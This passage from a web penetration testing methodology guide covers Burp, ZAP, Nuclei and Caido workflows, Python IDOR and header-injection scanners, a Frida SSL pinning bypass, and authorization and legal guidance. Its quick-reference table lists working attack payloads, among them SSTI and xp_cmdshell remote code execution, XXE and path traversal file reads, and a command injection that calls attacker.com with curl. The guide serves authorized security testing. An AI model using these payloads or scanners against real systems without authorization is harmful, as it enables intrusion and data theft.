   - Each finding follows the template in 9.2

7. Appendices
   - A: Full tool output logs
   - B: Raw evidence screenshots
   - C: Requests/responses for each finding
   - D: Remediation verification results
   - E: Out-of-scope observations
```

### 9.7 Responsible Disclosure Process

When vulnerabilities are found outside of a formal engagement (bug bounty, independent research):

1. **Document thoroughly** before any contact
2. **Find the right contact**: security@, security.txt (/.well-known/security.txt), bug bounty program
3. **Initial report**: Clear description, reproduction steps, impact, no ultimatums
4. **Coordinate timeline**: Propose 90-day disclosure deadline (industry standard per Google Project Zero)
5. **No exploitation**: Prove impact minimally — do not access real user data
6. **Follow up**: If no response in 7 days, try alternate channels
7. **Public disclosure**: Only after deadline passes, or with vendor agreement

---

## 10. Tool Arsenal and Automation

### 10.1 Burp Suite Professional Complete Workflow

**Project Setup:**

```
1. Create new project → save to disk (preserve session data)
2. Configure scope:
   - Target → Scope → Add: *.target.com
   - Suite options → "Use advanced scope control"
3. Configure upstream proxy (if testing through VPN/TOR):
   - User options → Connections → Upstream Proxy Servers
4. Session handling:
   - Project options → Sessions → Session Handling Rules
   - Add macro for auto-login when session expires
5. Collaborator: Burp → Burp Collaborator client (or self-hosted)
```

**Active Scanning Configuration:**

```
Scan Configuration:
├── Audit Speed: Normal (Thorough for critical apps)
├── Handling of insertion points:
│   ├── URL parameters: Enabled
│   ├── Body parameters: Enabled
│   ├── Cookies: Enabled
│   ├── HTTP headers: Selective (Host, Referer, User-Agent)
│   ├── AMF parameters: If applicable
│   └── URL path: filename and directory
├── Scan accuracy: Normal
├── Active scanning → Issues reported:
│   ├── SQL injection: All subtypes
│   ├── XSS: All subtypes
│   ├── Command injection: Enabled
│   ├── File path traversal: Enabled
│   ├── SSRF: Enabled (with Collaborator)
│   └── Deserialization: Enabled
└── Scan speed: 
    ├── Concurrent requests: 10-20 (adjust for target capacity)
    └── Throttle between requests: 100ms (increase if target rate-limits)
```

**Essential Extensions:**

| Extension | Purpose |
|-----------|---------|
| Logger++ | Advanced logging and grep |
| Autorize | Automated access control testing |
| Param Miner | Hidden parameter discovery |
| Active Scan++ | Enhanced scanner checks |
| Turbo Intruder | High-speed request engine |
| Hackvertor | Encoding/decoding payloads |
| JSON Web Tokens | JWT manipulation |
| SAML Raider | SAML testing |
| Upload Scanner | File upload vulnerability testing |
| Collaborator Everywhere | Inject Collaborator payloads into all parameters |

**Intruder Attack Types:**

```
Sniper:      Single payload set, one position at a time
Battering Ram: Single payload set, all positions simultaneously
Pitchfork:   Multiple payload sets, synchronized (position 1 = list 1, etc.)
Cluster Bomb: Multiple payload sets, all combinations (cartesian product)
```

### 10.2 OWASP ZAP Automation

**ZAP Automation Framework YAML:**

```yaml
---
env:
  contexts:
    - name: "target-app"
      urls:
        - "https://target.com"
      includePaths:
        - "https://target.com/.*"
      excludePaths:
        - "https://target.com/logout.*"
      authentication:
        method: "form"
        parameters:
          loginUrl: "https://target.com/login"
          loginRequestData: "username={%username%}&password={%password%}"
        verification:
          method: "response"
          loggedInRegex: "\\QWelcome\\E"
      users:
        - name: "test-user"
          credentials:
            username: "testuser"
            password: "testpass123"

jobs:
  - type: spider
    parameters:
      context: "target-app"
      user: "test-user"
      maxDuration: 10
      maxDepth: 5

  - type: spiderAjax
    parameters:
      context: "target-app"
      user: "test-user"
      maxDuration: 10
      maxCrawlDepth: 5
      browserId: "firefox-headless"

  - type: passiveScan-wait
    parameters:
      maxDuration: 5

  - type: activeScan
    parameters:
      context: "target-app"
      user: "test-user"
      policy: "Default Policy"
      maxRuleDurationInMins: 5
      maxScanDurationInMins: 60

  - type: report
    parameters:
      template: "traditional-html"
      reportDir: "/output/reports/"
      reportFile: "zap-report"
    risks:
      - high
      - medium
      - low
```

```bash
# Run ZAP automation
docker run --rm -v $(pwd):/zap/wrk/:rw \
  -t ghcr.io/zaproxy/zaproxy:stable zap.sh \
  -cmd -autorun /zap/wrk/automation.yaml

# ZAP CLI quick scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' \
  https://target.com

# ZAP API scripting
zap-cli --zap-url http://localhost -p 8080 spider https://target.com
zap-cli --zap-url http://localhost -p 8080 active-scan https://target.com
zap-cli --zap-url http://localhost -p 8080 report -o report.html -f html
```

### 10.3 Nuclei Templates for Mass Scanning

```bash
# Update templates
nuclei -update-templates

# Scan single target
nuclei -u https://target.com -severity critical,high -o results.txt

# Scan multiple targets
nuclei -l targets.txt -t cves/ -t misconfiguration/ -t exposures/ \
  -severity critical,high -rate-limit 50 -bulk-size 25 -o findings.txt

# Specific template categories
nuclei -u https://target.com -t http/cves/2024/  # Latest CVEs
nuclei -u https://target.com -t http/exposures/  # Sensitive file exposure
nuclei -u https://target.com -t http/misconfiguration/  # Misconfigs
nuclei -u https://target.com -t http/takeovers/  # Subdomain takeover
nuclei -u https://target.com -t http/vulnerabilities/  # Generic vulns

# Custom template example
nuclei -u https://target.com -t custom-templates/ -v
```

**Custom Nuclei Template (SQL Injection Detection):**

```yaml
id: custom-sqli-error-based

info:
  name: Error-Based SQL Injection Detection
  author: assessor
  severity: critical
  tags: sqli,injection

http:
  - method: GET
    path:
      - "{{BaseURL}}{{path}}?{{param}}=1'+AND+1=CONVERT(int,(SELECT+@@version))--+-"

    payloads:
      path:
        - /search
        - /products
        - /api/users
      param:
        - id
        - q
        - search
        - user_id

    attack: clusterbomb

    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "SQL syntax.*MySQL"
          - "Warning.*mysql_"
          - "PostgreSQL.*ERROR"
          - "Driver.* SQL[-_ ]*Server"
          - "ORA-[0-9][0-9][0-9][0-9]"
          - "Microsoft SQL Native Client error"
          - "ODBC SQL Server Driver"
          - "SQLite.*error"
          - "Unclosed quotation mark"
```

### 10.4 Custom Python Scripts

**Automated IDOR Tester:**

```python
#!/usr/bin/env python3
"""idor_scanner.py — Automated IDOR detection across API endpoints."""

import httpx
import asyncio
from dataclasses import dataclass


@dataclass
class IDORResult:
    endpoint: str
    object_id: str
    status_code: int
    accessible: bool
    response_size: int


async def test_idor(
    client: httpx.AsyncClient,
    base_url: str,
    endpoint_template: str,
    auth_token: str,
    id_range: range,
    own_ids: set[str],
) -> list[IDORResult]:
    """Test for IDOR by accessing objects not owned by authenticated user."""
    results = []
    headers = {"Authorization": f"Bearer {auth_token}"}

    for obj_id in id_range:
        if str(obj_id) in own_ids:
            continue  # Skip objects owned by test user

        url = f"{base_url}{endpoint_template.format(id=obj_id)}"
        try:
            resp = await client.get(url, headers=headers)
            result = IDORResult(
                endpoint=url,
                object_id=str(obj_id),
                status_code=resp.status_code,
                accessible=resp.status_code == 200,
                response_size=len(resp.content),
            )
            results.append(result)

            if result.accessible:
                print(f"[!] IDOR: {url} → {resp.status_code} ({result.response_size} bytes)")

        except httpx.RequestError as e:
            print(f"[x] Error: {url} — {e}")

    return results


async def main():
    base_url = "https://target.com"
    endpoints = [
        "/api/v1/users/{id}/profile",
        "/api/v1/orders/{id}",
        "/api/v1/documents/{id}/download",
        "/api/v1/invoices/{id}",
    ]
    auth_token = "YOUR_LOW_PRIV_TOKEN"
    own_ids = {"42", "43"}  # IDs belonging to test user

    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
        for endpoint in endpoints:
            print(f"\n[*] Testing: {endpoint}")
            results = await test_idor(
                client, base_url, endpoint, auth_token, range(1, 100), own_ids
            )
            accessible = [r for r in results if r.accessible]
            print(f"    Accessible: {len(accessible)}/{len(results)}")


if __name__ == "__main__":
    asyncio.run(main())
```

**Header Injection Scanner:**

```python
#!/usr/bin/env python3
"""header_injection_scanner.py — Test for host header and CRLF injection."""

import httpx
import asyncio


CRLF_PAYLOADS = [
    "%0d%0aInjected-Header:true",
    "%0aInjected-Header:true",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "\r\nInjected-Header:true",
    "%E5%98%8A%E5%98%8DInjected-Header:true",  # Unicode CRLF
]

HOST_HEADER_PAYLOADS = [
    "evil.com",
    "target.com@evil.com",
    "target.com%00evil.com",
    "target.com.evil.com",
]


async def test_crlf(client: httpx.AsyncClient, base_url: str) -> list[dict]:
    """Test CRLF injection in various parameters."""
    findings = []

    for payload in CRLF_PAYLOADS:
        # Test in URL path
        url = f"{base_url}/redirect?url=http://target.com{payload}"
        try:
            resp = await client.get(url, follow_redirects=False)
            if "Injected-Header" in str(resp.headers):
                findings.append({
                    "type": "CRLF",
                    "location": "URL parameter",
                    "payload": payload,
                    "evidence": str(resp.headers),
                })
        except httpx.RequestError:
            pass

    return findings


async def test_host_header(client: httpx.AsyncClient, base_url: str) -> list[dict]:
    """Test host header injection (password reset poisoning)."""
    findings = []

    for payload in HOST_HEADER_PAYLOADS:
        headers = {"Host": payload}
        try:
            resp = await client.get(f"{base_url}/password-reset", headers=headers)
            if payload in resp.text:
                findings.append({
                    "type": "Host Header Injection",
                    "payload": payload,
                    "evidence": f"Payload reflected in response body",
                })
        except httpx.RequestError:
            pass

        # X-Forwarded-Host
        headers = {"X-Forwarded-Host": payload}
        try:
            resp = await client.get(f"{base_url}/", headers=headers)
            if payload in resp.text:
                findings.append({
                    "type": "X-Forwarded-Host Injection",
                    "payload": payload,
                    "evidence": f"Payload reflected via X-Forwarded-Host",
                })
        except httpx.RequestError:
            pass

    return findings


async def main():
    base_url = "https://target.com"

    async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
        print("[*] Testing CRLF injection...")
        crlf_results = await test_crlf(client, base_url)

        print("[*] Testing Host Header injection...")
        host_results = await test_host_header(client, base_url)

        all_findings = crlf_results + host_results
        if all_findings:
            print(f"\n[!] Found {len(all_findings)} issues:")
            for f in all_findings:
                print(f"    [{f['type']}] {f['payload']}")
        else:
            print("\n[+] No injection points found")


if __name__ == "__main__":
    asyncio.run(main())
```

### 10.5 Caido as Burp Alternative

Caido is a Rust-based web security tool offering similar interception and manipulation capabilities to Burp Suite, with lower resource consumption and a modern UI.

**Key Features:**

```
Interceptor:     HTTP/HTTPS proxy with request/response modification
Replay:          Repeater equivalent — modify and resend requests
Automate:        Intruder equivalent — parametric fuzzing
Sitemap:         Passive crawl tree
Search:          Full-text search across all captured traffic
Workflows:       Automation pipelines (convert scripts → passive/active checks)
Match & Replace: Automatic request/response modification rules
HTTPQL:          Query language for filtering traffic
```

**HTTPQL Query Examples:**

```
# Find all requests with SQL-related parameters
req.query.name eq "id" OR req.query.name eq "user_id"

# Find responses containing error messages
resp.body contains "error" AND resp.status >= 500

# Find requests to API endpoints
req.path matches "/api/.*" AND req.method eq "POST"

# Find large responses (potential data exposure)
resp.length > 100000
```

### 10.6 Browser DevTools for Manual Testing

**Console — JavaScript Execution:**

```javascript
// Extract all links from current page
[...document.querySelectorAll('a[href]')].map(a => a.href)

// Extract all form actions and inputs
[...document.querySelectorAll('form')].map(f => ({
  action: f.action,
  method: f.method,
  inputs: [...f.querySelectorAll('input,textarea,select')].map(i => ({
    name: i.name, type: i.type, value: i.value
  }))
}))

// Monitor all XHR/Fetch requests
const origFetch = window.fetch;
window.fetch = async (...args) => {
  console.log('[Fetch]', args);
  const resp = await origFetch(...args);
  console.log('[Response]', resp.status, resp.url);
  return resp;
};

// Extract JWT from localStorage/sessionStorage
Object.keys(localStorage).forEach(k => {
  const v = localStorage[k];
  if (v && v.startsWith('eyJ')) console.log(`[JWT] ${k}:`, v);
});

// Trigger all event handlers on a specific element
const el = document.querySelector('#target');
['click','mouseover','mouseenter','focus','blur','change','input','submit']
  .forEach(e => el.dispatchEvent(new Event(e, {bubbles: true})));
```

**Network Tab — Key Analysis Points:**

```
1. Filter by XHR/Fetch to isolate API calls
2. Right-click → Copy as cURL for replay in terminal
3. Check Initiator column to trace which JS made the request
4. Monitor WebSocket frames in WS tab
5. Check for sensitive data in Preflight (OPTIONS) responses
6. Look for tokens/credentials in request headers
7. Identify API versioning patterns
8. Monitor cookie changes via "Preserve log" + cookie filter
```

**Application Tab — Storage Inspection:**

```
Cookies:        Check flags (Secure, HttpOnly, SameSite)
Local Storage:  Look for tokens, user data, PII
Session Storage: Same as local but per-tab
IndexedDB:      Application databases (offline data, cached responses)
Cache Storage:  Service worker cached resources
```

### 10.7 Mobile Proxy Setup for API Testing

**Android (physical or emulator):**

```bash
# Install Burp/Caido CA certificate on Android
# 1. Export proxy CA cert in DER format
# 2. Rename to .cer
# 3. Push to device:
adb push burp-ca.cer /sdcard/

# 4. Install: Settings → Security → Install from storage
# OR for Android 7+ (user certs not trusted by default):
# Root required, or use Magisk module "MagiskTrustUserCerts"
# OR patch APK with network_security_config.xml:
# <network-security-config>
#   <base-config cleartextTrafficPermitted="true">
#     <trust-anchors>
#       <certificates src="system" />
#       <certificates src="user" />
#     </trust-anchors>
#   </base-config>
# </network-security-config>

# 5. Set proxy on device WiFi settings
# OR use adb reverse proxy:
adb reverse tcp:8080 tcp:8080
```

**iOS:**

```
1. Configure proxy in WiFi settings → proxy IP:port
2. Navigate to http://burpsuite (or proxy URL) to download CA
3. Install profile: Settings → General → VPN & Device Management
4. Trust certificate: Settings → General → About → Certificate Trust Settings
5. For apps with certificate pinning:
   - Jailbreak + SSL Kill Switch 2 (Cydia)
   - OR Frida + objection: objection explore -s "android sslpinning disable"
   - OR Frida script: frida -U -f com.target.app -l bypass-ssl.js
```

**Frida SSL Pinning Bypass (universal):**

```javascript
// frida_ssl_bypass.js
Java.perform(function() {
    // TrustManager bypass
    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var ctx = SSLContext.getInstance('TLS');
    ctx.init(null, [TrustManager.$new()], null);

    // OkHttp CertificatePinner bypass
    try {
        var CertPinner = Java.use('okhttp3.CertificatePinner');
        CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {};
    } catch(e) {}
});
```

```bash
# Run Frida bypass
frida -U -f com.target.app -l frida_ssl_bypass.js --no-pause

# Using objection (higher-level Frida wrapper)
objection -g com.target.app explore
# Then in objection REPL:
android sslpinning disable
ios sslpinning disable
```

---

## Appendix A: Quick Reference — Common Payloads by Context

| Context | Payload | Purpose |
|---------|---------|---------|
| SQL (MySQL) | `' OR 1=1-- -` | Auth bypass |
| SQL (MSSQL) | `'; EXEC xp_cmdshell 'whoami'-- -` | RCE |
| XSS (HTML) | `<img src=x onerror=alert(1)>` | Reflected XSS |
| XSS (JS) | `';alert(1)//` | JS context escape |
| SSTI (Jinja2) | `{{7*7}}` | Detection |
| SSTI (Jinja2) | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` | RCE |
| SSRF | `http://169.254.169.254/latest/meta-data/` | Cloud metadata |
| XXE | `<!ENTITY x SYSTEM "file:///etc/passwd">` | File read |
| Command Inj | `; curl http://attacker.com/$(whoami)` | Blind RCE |
| LDAP | `*)(uid=*))(|(uid=*` | Auth bypass |
| Path Traversal | `../../../../etc/passwd` | File read |
| Open Redirect | `/redirect?url=//evil.com` | Phishing |
| CRLF | `%0d%0aSet-Cookie: admin=true` | Header injection |
| Prototype | `{"__proto__":{"isAdmin":true}}` | Privilege escalation |
| GraphQL | `{__schema{types{name}}}` | Introspection |

## Appendix B: Engagement Checklist

```
PRE-ENGAGEMENT
□ Signed authorization (legal authority, not just IT contact)
□ Scope document (include + exclude lists)
□ Rules of engagement signed by both parties
□ Emergency contacts established
□ Testing window confirmed
□ Insurance/liability verified
□ NDA executed
□ Third-party permissions obtained (cloud, CDN, SaaS)

RECONNAISSANCE
□ Passive OSINT complete
□ Subdomain enumeration
□ Technology fingerprinting
□ Directory/file discovery
□ Parameter mapping
□ API documentation gathered
□ JavaScript analysis for secrets/endpoints

TESTING
□ Authentication testing (all vectors)
□ Authorization testing (horizontal + vertical)
□ Injection testing (SQL, NoSQL, OS, LDAP, XML)
□ XSS testing (reflected, stored, DOM)
□ SSRF testing
□ Business logic testing
□ Session management testing
□ File upload testing
□ Deserialization testing
□ Request smuggling testing

POST-TESTING
□ All test artifacts removed from target
□ Test accounts deactivated
□ Findings documented with evidence
□ Report drafted and peer-reviewed
□ Report encrypted and delivered securely
□ Retesting scheduled (if in scope)
□ Evidence stored encrypted with retention policy
```

## Appendix C: Recommended Wordlists

| Purpose | Wordlist | Location |
|---------|----------|----------|
| Directories | raft-large-directories.txt | SecLists/Discovery/Web-Content/ |
| Files | raft-large-files.txt | SecLists/Discovery/Web-Content/ |
| Parameters | burp-parameter-names.txt | SecLists/Discovery/Web-Content/ |
| Subdomains | subdomains-top1million-110000.txt | SecLists/Discovery/DNS/ |
| Passwords | rockyou.txt | /usr/share/wordlists/ |
| Common creds | top-usernames-shortlist.txt | SecLists/Usernames/ |
| API paths | api-endpoints.txt | SecLists/Discovery/Web-Content/ |
| Virtual hosts | vhosts-default.txt | SecLists/Discovery/DNS/ |
| Fuzzing | special-chars.txt | SecLists/Fuzzing/ |
| LFI | LFI-Jhaddix.txt | SecLists/Fuzzing/LFI/ |

## Appendix D: Legal and Ethical Framework

**Relevant Laws by Jurisdiction:**

| Jurisdiction | Law | Key Provision |
|-------------|-----|---------------|
| USA | CFAA (18 USC §1030) | Unauthorized access to protected computers |
| UK | Computer Misuse Act 1990 | Unauthorized access, modification |
| EU | Directive 2013/40/EU | Attacks against information systems |
| Germany | StGB §202a-c | Data espionage, interception |
| Australia | Criminal Code Act 1995 §477-478 | Unauthorized access, modification |

**Ethical Principles:**

1. Never exceed authorized scope
2. Minimize collateral damage
3. Protect discovered vulnerabilities (no premature disclosure)
4. Handle discovered data with same care as client handles it
5. Report all findings honestly — including limitations
6. Never destroy, modify, or encrypt production data
7. Test during agreed windows to minimize business disruption
8. Immediately report critical findings (do not wait for final report)

---

*End of document. Last updated: 2025-03-22.*
